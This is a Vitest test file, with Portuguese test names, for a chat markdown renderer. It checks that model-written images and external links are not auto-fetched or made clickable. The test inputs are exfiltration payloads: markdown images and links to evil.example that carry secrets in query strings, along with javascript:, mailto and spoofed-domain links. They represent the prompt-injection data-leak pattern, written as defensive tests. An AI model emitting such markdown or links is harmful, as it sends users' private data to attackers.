import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, test } from "vitest"
import { ChatMarkdown } from "./chat-markdown"

const render = (md: string) => renderToStaticMarkup(createElement(ChatMarkdown, null, md))

describe("ChatMarkdown — imagem não é buscada", () => {
	test("imagem externa vira link com o texto alternativo, sem <img> e sem abrir sozinha", () => {
		const html = render("Veja ![resumo](https://evil.example/x.png?d=segredo)")
		expect(html).not.toContain("<img")
		// Externo pede confirmação: o endereço não fica num href clicável.
		expect(html).not.toContain("href=")
		expect(html).toContain("[imagem: resumo]")
		expect(html).toContain("evil.example")
	})

	test("imagem por referência também não vira <img>", () => {
		const html = render("![x][ref]\n\n[ref]: https://evil.example/y.png")
		expect(html).not.toContain("<img")
	})

	test("src que não é http(s) vira só texto", () => {
		const html = render("![](data:image/png;base64,AAAA)")
		expect(html).not.toContain("<img")
		expect(html).not.toContain("href=")
		expect(html).toContain("[imagem]")
	})

	test("HTML cru do modelo não é interpretado", () => {
		expect(render('<img src="https://evil.example/z.png">')).not.toContain("<img")
	})
})

describe("ChatMarkdown — link escrito pelo modelo", () => {
	test("link externo mostra o domínio e não vira href (abre só depois de confirmar)", () => {
		const html = render("[ver detalhes](https://evil.example/c?d=receita-secreta-e-mais)")
		expect(html).not.toContain("href=")
		expect(html).not.toContain("receita-secreta")
		expect(html).toContain("ver detalhes")
		expect(html).toContain("evil.example")
		expect(html).toContain("<button")
	})

	test("o domínio mostrado é o de verdade, não o que o texto do link diz", () => {
		const html = render("[https://sisub.fab.mil.br](https://evil.example/x)")
		expect(html).toContain("evil.example")
	})

	test("link interno do app segue como link normal", () => {
		const html = render("[abrir cardápio](/kitchen/7/planning)")
		expect(html).toContain('href="/kitchen/7/planning"')
		expect(html).toContain("abrir cardápio")
	})

	test("esquema fora de http(s) vira só texto", () => {
		for (const md of ["[x](javascript:alert(1))", "[x](mailto:a@b.c?body=segredo)", "[x](//evil.example/y)"]) {
			const html = render(md)
			expect(html).not.toContain("href=")
			expect(html).not.toContain("segredo")
		}
	})

	test("tab por entidade chega percent-encoded: o link fica no próprio app, não vira //host", () => {
		// O navegador só descarta tab/quebra crus. O markdown codifica a entidade como %09, e
		// `/%09/evil.example` é um caminho do sisub. O `classifyChatLink` recusa o cru de qualquer jeito.
		const html = render("[x](/&#9;/evil.example/?d=1)")
		expect(html).toContain('href="/%09/evil.example/?d=1"')
	})
})
